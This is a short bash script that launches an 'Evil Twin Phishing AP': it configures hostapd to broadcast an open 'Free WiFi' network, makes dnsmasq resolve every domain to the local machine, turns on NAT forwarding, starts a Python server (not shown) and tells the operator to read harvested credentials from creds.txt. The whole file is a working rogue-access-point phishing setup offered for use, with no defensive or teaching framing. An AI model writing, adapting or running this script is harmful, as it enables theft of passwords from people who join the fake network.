#!/bin/bash
echo "🚀 Starting Evil Twin Phishing AP..."

# Kill existing processes
pkill -f hostapd dnsmasq python flask 2>/dev/null

# Config files
cat > hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=Free WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.4.2,192.168.4.30,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
address=/#/192.168.4.1
log-dhcp
EOF

# Network setup
ip addr flush dev wlan0 2>/dev/null
ip addr add 192.168.4.1/24 dev wlan0
ip link set wlan0 up
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -F; iptables -t nat -A POSTROUTING -o $(ip route | grep default | awk '{print $5}') -j MASQUERADE

# Start services
nohup python server.py > server.log 2>&1 &
sleep 2
hostapd hostapd.conf > hostapd.log 2>&1 &
dnsmasq -C dnsmasq.conf > dnsmasq.log 2>&1 &

echo "✅ AP running! SSID: Free WiFi"
echo "📱 Check creds: curl http://localhost/creds.txt"
echo "📊 Logs: tail -f *.log"
echo "🛑 Stop: ./stop.sh"
